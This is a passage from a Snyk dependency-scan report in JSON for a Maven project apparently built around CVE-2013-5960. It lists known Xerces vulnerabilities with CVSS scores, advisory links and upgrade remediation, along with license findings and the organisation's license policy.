          "cvssV3Vector": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
          "cvssV3BaseScore": 5.3,
          "modificationTime": "2022-05-04T00:54:18.528439Z"
        },
        {
          "assigner": "NVD",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
          "cvssV3BaseScore": 5.3,
          "modificationTime": "2022-10-07T01:11:33.367236Z"
        },
        {
          "assigner": "Red Hat",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
          "cvssV3BaseScore": 5.3,
          "modificationTime": "2022-09-01T18:48:45.581577Z"
        }
      ],
      "description": "## Overview\n[xerces:xercesImpl](http://xerces.apache.org) is a that is used for high performance, fully compliant XML parsers in the Apache Xerces family.\n\nAffected versions of this package are vulnerable to Denial of Service (DoS). Vulnerability in the Java SE, Java SE Embedded, JRockit component of Oracle Java SE (subcomponent: JAXP). Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded, JRockit. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Java SE, Java SE Embedded, JRockit. Note: Applies to client and server deployment of Java. This vulnerability can be exploited through sandboxed Java Web Start applications and sandboxed Java applets. It can also be exploited by supplying data to APIs in the specified Component without using sandboxed Java Web Start applications or sandboxed Java applets, such as through a web service.\n## Remediation\nUpgrade `xerces:xercesImpl` to version 2.12.0 or higher.\n## References\n- [Apache Security Advisory](https://lists.apache.org/thread.html/49dc6702104a86ecbb40292dcd329ce9ae4c32b74733199ecab14a73@%3Cj-users.xerces.apache.org%3E)\n- [CONFIRM](https://support.hpe.com/hpsc/doc/public/display?docLocale=en_US&docId=emr_na-hpesbst03857en_us)\n- [Debian Security Advisory](https://www.debian.org/security/2018/dsa-4185)\n- [Netapp Security Advisory](https://security.netapp.com/advisory/ntap-20180419-0001/)\n- [Oracle Security Advisory](http://www.oracle.com/technetwork/security-advisory/cpuapr2018-3678067.html)\n- [RHSA Security Advisory](https://access.redhat.com/errata/RHSA-2018:1188)\n- [Security Focus](http://www.securityfocus.com/bid/103872)\n- [Security Tracker](http://www.securitytracker.com/id/1040697)\n- [Ubuntu Security Advisory](https://usn.ubuntu.com/3644-1/)\n",
      "epssDetails": {
        "percentile": "0.55253",
        "probability": "0.00184",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2018-2799"
        ],
        "CWE": [
          "CWE-400"
        ]
      },
      "packageName": "xerces:xercesImpl",
      "proprietary": false,
      "creationTime": "2023-09-27T12:36:30.558422Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2018-04-19T02:29:00Z",
      "packageManager": "maven",
      "mavenModuleName": {
        "groupId": "xerces",
        "artifactId": "xercesimpl"
      },
      "publicationTime": "2019-01-31T10:17:47.304391Z",
      "modificationTime": "2023-09-27T12:44:53.634611Z",
      "socialTrendAlert": false,
      "severityWithCritical": "medium",
      "from": [
        "io.github.jensdietrich.xshady:CVE-2013-5960@1.0.0",
        "org.owasp.esapi:esapi@2.1.0",
        "xom:xom@1.2.5",
        "xerces:xercesImpl@2.8.0"
      ],
      "upgradePath": [
        false,
        "org.owasp.esapi:esapi@2.2.0.0"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "xerces:xercesImpl",
      "version": "2.8.0"
    },
    {
      "id": "SNYK-JAVA-XERCES-608891",
      "title": "Improper Input Validation",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N/RL:O",
      "credit": [
        "Chess Hazlett"
      ],
      "semver": {
        "vulnerable": [
          "[,2.12.0.SP03)"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [
        "2.12.0.SP03"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "java",
      "severity": "medium",
      "cvssScore": 5.3,
      "functions": [
        {
          "version": [
            "[,2.12.0.SP3)"
          ],
          "functionId": {
            "filePath": "org/apache/xerces/impl/xs/XMLSchemaValidator.java",
            "className": "XMLSchemaValidator",
            "functionName": "handleStartElement"
          }
        }
      ],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "xerces:xercesimpl",
      "references": [
        {
          "url": "https://github.com/jboss/xerces/commit/76348d1f67c20a658ff47ba009762372a7a47300",
          "title": "GitHub Commit"
        },
        {
          "url": "https://bugzilla.redhat.com/show_bug.cgi?id=1860054",
          "title": "RedHat Bugzilla Bug"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "Red Hat",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
          "cvssV3BaseScore": 5.3,
          "modificationTime": "2023-03-26T14:48:45.766220Z"
        },
        {
          "assigner": "NVD",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
          "cvssV3BaseScore": 5.3,
          "modificationTime": "2022-01-03T18:05:02.659302Z"
        }
      ],
      "description": "## Overview\n[xerces:xercesImpl](http://xerces.apache.org) is a that is used for high performance, fully compliant XML parsers in the Apache Xerces family.\n\nAffected versions of this package are vulnerable to Improper Input Validation due to the way the XMLSchemaValidator class in the JAXP component of Wildfly enforced the \"use-grammar-pool-only\" feature. This flaw allows a specially-crafted XML file to manipulate the validation process in certain cases. This issue is the same flaw as CVE-2020-14621, which affected OpenJDK, and uses a similar code.\n## Remediation\nUpgrade `xerces:xercesImpl` to version 2.12.0.SP03 or higher.\n## References\n- [GitHub Commit](https://github.com/jboss/xerces/commit/76348d1f67c20a658ff47ba009762372a7a47300)\n- [RedHat Bugzilla Bug](https://bugzilla.redhat.com/show_bug.cgi?id=1860054)\n",
      "epssDetails": {
        "percentile": "0.37283",
        "probability": "0.00090",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2020-14338"
        ],
        "CWE": [
          "CWE-20"
        ]
      },
      "packageName": "xerces:xercesImpl",
      "proprietary": false,
      "creationTime": "2020-08-28T15:36:13.189095Z",
      "functions_new": [
        {
          "version": [
            "[,2.12.0.SP3)"
          ],
          "functionId": {
            "className": "org.apache.xerces.impl.xs.XMLSchemaValidator",
            "functionName": "handleStartElement"
          }
        }
      ],
      "alternativeIds": [],
      "disclosureTime": "2020-08-27T00:00:00Z",
      "packageManager": "maven",
      "mavenModuleName": {
        "groupId": "xerces",
        "artifactId": "xercesimpl"
      },
      "publicationTime": "2020-09-14T03:24:10Z",
      "modificationTime": "2023-03-26T14:48:45.766220Z",
      "socialTrendAlert": false,
      "severityWithCritical": "medium",
      "from": [
        "io.github.jensdietrich.xshady:CVE-2013-5960@1.0.0",
        "org.owasp.esapi:esapi@2.1.0",
        "xom:xom@1.2.5",
        "xerces:xercesImpl@2.8.0"
      ],
      "upgradePath": [
        false,
        "org.owasp.esapi:esapi@2.2.0.0"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "xerces:xercesImpl",
      "version": "2.8.0"
    },
    {
      "id": "snyk:lic:maven:org.beanshell:bsh-core:LGPL-3.0",
      "type": "license",
      "title": "LGPL-3.0 license",
      "semver": {
        "vulnerable": [
          "[2.0b4,)"
        ]
      },
      "license": "LGPL-3.0",
      "language": "java",
      "description": "LGPL-3.0 license",
      "packageName": "org.beanshell:bsh-core",
      "creationTime": "2023-06-14T15:30:18.128Z",
      "packageManager": "maven",
      "publicationTime": "2023-06-14T15:30:18.128Z",
      "severity": "medium",
      "severityWithCritical": "medium",
      "from": [
        "io.github.jensdietrich.xshady:CVE-2013-5960@1.0.0",
        "org.owasp.esapi:esapi@2.1.0",
        "org.beanshell:bsh-core@2.0b4"
      ],
      "upgradePath": [
        false,
        "org.owasp.esapi:esapi@2.2.0.0"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "org.beanshell:bsh-core",
      "version": "2.0b4"
    },
    {
      "id": "snyk:lic:maven:xom:xom:LGPL-2.1",
      "type": "license",
      "title": "LGPL-2.1 license",
      "semver": {
        "vulnerable": [
          "[1.2.5,)"
        ]
      },
      "license": "LGPL-2.1",
      "language": "java",
      "description": "LGPL-2.1 license",
      "packageName": "xom:xom",
      "creationTime": "2023-06-13T17:13:06.282Z",
      "packageManager": "maven",
      "publicationTime": "2023-06-13T17:13:06.282Z",
      "severity": "medium",
      "severityWithCritical": "medium",
      "from": [
        "io.github.jensdietrich.xshady:CVE-2013-5960@1.0.0",
        "org.owasp.esapi:esapi@2.1.0",
        "xom:xom@1.2.5"
      ],
      "upgradePath": [
        false,
        "org.owasp.esapi:esapi@2.2.0.0"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "xom:xom",
      "version": "1.2.5"
    }
  ],
  "ok": false,
  "dependencyCount": 26,
  "org": "wtwhite",
  "policy": "# Snyk (https://snyk.io) policy file, patches or ignores known vulnerabilities.\nversion: v1.25.1\nignore: {}\npatch: {}\n",
  "isPrivate": true,
  "licensesPolicy": {
    "severities": {},
    "orgLicenseRules": {
      "AGPL-1.0": {
        "licenseType": "AGPL-1.0",
        "severity": "high",
        "instructions": ""
      },
      "AGPL-3.0": {
        "licenseType": "AGPL-3.0",
        "severity": "high",
        "instructions": ""
      },
      "Artistic-1.0": {
        "licenseType": "Artistic-1.0",
        "severity": "medium",
        "instructions": ""
      },
      "Artistic-2.0": {
        "licenseType": "Artistic-2.0",
        "severity": "medium",
        "instructions": ""
      },
      "CDDL-1.0": {
        "licenseType": "CDDL-1.0",
        "severity": "medium",
        "instructions": ""
      },
      "CPOL-1.02": {
        "licenseType": "CPOL-1.02",
        "severity": "high",
        "instructions": ""
      },
      "EPL-1.0": {
        "licenseType": "EPL-1.0",
        "severity": "medium",
        "instructions": ""
      },
      "GPL-2.0": {
        "licenseType": "GPL-2.0",
        "severity": "high",
        "instructions": ""
      },
      "GPL-3.0": {
        "licenseType": "GPL-3.0",
        "severity": "high",
        "instructions": ""
      },
      "LGPL-2.0": {
        "licenseType": "LGPL-2.0",
        "severity": "medium",
        "instructions": ""
      },
      "LGPL-2.1": {
        "licenseType": "LGPL-2.1",
        "severity": "medium",
        "instructions": ""
      },
      "LGPL-3.0": {
        "licenseType": "LGPL-3.0",
        "severity": "medium",
        "instructions": ""
      },
      "MPL-1.1": {
        "licenseType": "MPL-1.1",
        "severity": "medium",
        "instructions": ""
      },
      "MPL-2.0": {
        "licenseType": "MPL-2.0",
        "severity": "medium",
        "instructions": ""
      },
      "MS-RL": {
        "licenseType": "MS-RL",
        "severity": "medium",
        "instructions": ""
      },
      "SimPL-2.0": {
        "licenseType": "SimPL-2.0",
        "severity": "high",
        "instructions": ""
      }
    }
  },
  "packageManager": "maven",
  "ignoreSettings": {
    "adminOnly": false,
    "reasonRequired": false,
    "disregardFilesystemIgnores": false
  },
  "summary": "41 vulnerable dependency paths",
  "remediation": {
    "unresolved": [],
    "upgrade": {
      "org.owasp.esapi:esapi@2.1.0": {
        "upgradeTo": "org.owasp.esapi:esapi@2.5.2.0",
        "upgrades": [
          "commons-fileupload:commons-fileupload@1.2",
          "log4j:log4j@1.2.16",
          "log4j:log4j@1.2.16",
          "log4j:log4j@1.2.16",
          "log4j:log4j@1.2.16",
          "log4j:log4j@1.2.16",
          "log4j:log4j@1.2.16",
          "log4j:log4j@1.2.16",
          "net.sourceforge.nekohtml:nekohtml@1.9.12",
          "net.sourceforge.nekohtml:nekohtml@1.9.12",
          "net.sourceforge.nekohtml:nekohtml@1.9.12",
          "org.owasp.antisamy:antisamy@1.4.3",
          "org.owasp.antisamy:antisamy@1.4.3",
          "org.owasp.antisamy:antisamy@1.4.3",
          "org.owasp.esapi:esapi@2.1.0",
          "org.owasp.esapi:esapi@2.1.0",
          "org.owasp.esapi:esapi@2.1.0",
          "commons-codec:commons-codec@1.2",
          "commons-fileupload:commons-fileupload@1.2",
          "commons-fileupload:commons-fileupload@1.2",
          "commons-httpclient:commons-httpclient@3.1",
          "commons-httpclient:commons-httpclient@3.1",
          "org.owasp.antisamy:antisamy@1.4.3",
          "org.owasp.antisamy:antisamy@1.4.3",
          "xalan:xalan@2.7.0",
          "xalan:xalan@2.7.0",
          "xerces:xercesImpl@2.8.0",
          "xerces:xercesImpl@2.8.0",
          "xerces:xercesImpl@2.8.0",
          "xerces:xercesImpl@2.8.0",
          "xerces:xercesImpl@2.8.0",
          "xerces:xercesImpl@2.8.0",
          "xerces:xercesImpl@2.8.0",
          "org.beanshell:bsh-core@2.0b4",
          "xom:xom@1.2.5",
          "commons-collections:commons-collections@3.2",
          "commons-collections:commons-collections@3.2",
          "commons-fileupload:commons-fileupload@1.2",
          "commons-fileupload:commons-fileupload@1.2",
          "commons-fileupload:commons-fileupload@1.2",
          "org.owasp.esapi:esapi@2.1.0"
        ],
        "vulns": [
          "SNYK-JAVA-COMMONSFILEUPLOAD-3326457",
          "SNYK-JAVA-LOG4J-1300176",
          "SNYK-JAVA-LOG4J-2316893",
          "SNYK-JAVA-LOG4J-2342645",
          "SNYK-JAVA-LOG4J-2342646",
          "SNYK-JAVA-LOG4J-2342647",
          "SNYK-JAVA-LOG4J-3358774",
          "SNYK-JAVA-LOG4J-572732",
          "SNYK-JAVA-NETSOURCEFORGENEKOHTML-2621454",
          "SNYK-JAVA-NETSOURCEFORGENEKOHTML-2774754",
          "SNYK-JAVA-NETSOURCEFORGENEKOHTML-2803036",
          "SNYK-JAVA-ORGOWASPANTISAMY-1320080",
          "SNYK-JAVA-ORGOWASPANTISAMY-2774681",
          "SNYK-JAVA-ORGOWASPANTISAMY-2774682",
          "SNYK-JAVA-ORGOWASPESAPI-2803305",
          "SNYK-JAVA-ORGOWASPESAPI-2805301",
          "SNYK-JAVA-ORGOWASPESAPI-1088594",
          "SNYK-JAVA-COMMONSCODEC-561518",
          "SNYK-JAVA-COMMONSFILEUPLOAD-30401",
          "SNYK-JAVA-COMMONSFILEUPLOAD-31540",
          "SNYK-JAVA-COMMONSHTTPCLIENT-30083",
          "SNYK-JAVA-COMMONSHTTPCLIENT-31660",
          "SNYK-JAVA-ORGOWASPANTISAMY-31591",
          "SNYK-JAVA-ORGOWASPANTISAMY-598767",
          "SNYK-JAVA-XALAN-2953385",
          "SNYK-JAVA-XALAN-31385",
          "SNYK-JAVA-XERCES-2359991",
          "SNYK-JAVA-XERCES-30183",
          "SNYK-JAVA-XERCES-31497",
          "SNYK-JAVA-XERCES-31585",
          "SNYK-JAVA-XERCES-32014",
          "SNYK-JAVA-XERCES-5920442",
          "SNYK-JAVA-XERCES-608891",
          "snyk:lic:maven:org.beanshell:bsh-core:LGPL-3.0",
          "snyk:lic:maven:xom:xom:LGPL-2.1",
          "SNYK-JAVA-COMMONSCOLLECTIONS-30078",
          "SNYK-JAVA-COMMONSCOLLECTIONS-472711",
          "SNYK-JAVA-COMMONSFILEUPLOAD-30079",
          "SNYK-JAVA-COMMONSFILEUPLOAD-30080",
          "SNYK-JAVA-COMMONSFILEUPLOAD-30081",
          "SNYK-JAVA-ORGOWASPESAPI-30143"
        ]
      }
    },
    "patch": {},
    "ignore": {},
    "pin": {}
  },
  "filesystemPolicy": false,
  "filtered": {
    "ignore": [],
    "patch": []
  },
  "uniqueCount": 41,
  "projectName": "io.github.jensdietrich.xshady:CVE-2013-5960",
  "displayTargetFile": "pom.xml",
  "hasUnknownVersions": false,
  "path": "/home/wtwhite/code/xshady/CVE-2013-5960"
}
